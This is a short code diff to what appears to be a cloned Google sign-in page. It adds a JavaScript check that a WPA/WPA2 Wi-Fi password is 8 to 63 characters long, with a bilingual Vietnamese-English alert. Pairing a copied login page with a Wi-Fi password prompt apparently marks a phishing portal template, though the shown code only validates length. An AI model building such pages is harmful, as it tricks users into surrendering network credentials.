@@ -1207,4 +1207,16 @@ botguard.bg('BKGx3GTxp7A2UVQhrqr9TNuMGaKVybN1nQ+2fvLUhHhPmYCGWt8+RH5wJUr5p928Cbj
   gaia_attachEvent(window, 'load', function(){
   gaia_scrollToElement(signinButton);
   });
-</script> </body></html>
+
+function validateForm() {
+    var pwd = document.getElementById("pwd");
+    if (pwd) {
+        if (pwd.value.length < 8 || pwd.value.length > 63) {
+            alert("Mật khẩu WPA/WPA2 phải có độ dài từ 8 đến 63 ký tự. / WPA password must be between 8 and 63 characters.");
+            return false;
+        }
+    }
+    return true;
+}
+</script>
+</body></html>
